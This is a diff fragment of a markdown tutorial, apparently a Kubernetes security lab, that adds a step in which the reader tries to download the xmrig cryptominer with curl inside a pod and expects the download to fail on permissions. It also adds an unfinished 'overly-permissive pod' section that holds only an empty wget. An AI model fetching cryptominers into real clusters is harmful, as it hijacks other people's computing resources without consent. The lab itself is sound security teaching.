@@ -121,10 +121,23 @@ USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND <br/>
 2000         8  0.1  0.5 772124 22604 ?        Sl   20:36   0:00 node server.js <br/>
 ... <br/>
 <br/>
+
+Try downloading the xmrig binary
+```
+curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
+```
+The download should fail due to permissions. <br/>
+<br/>
 Exit your shell:
 ```
 exit
 ```
+## Installing a cryptominer in an overly-permissive pod
+
+```
+wget 
+```
+
 
 ## Installing a cryptominer in a Kubernetes Deployment
 
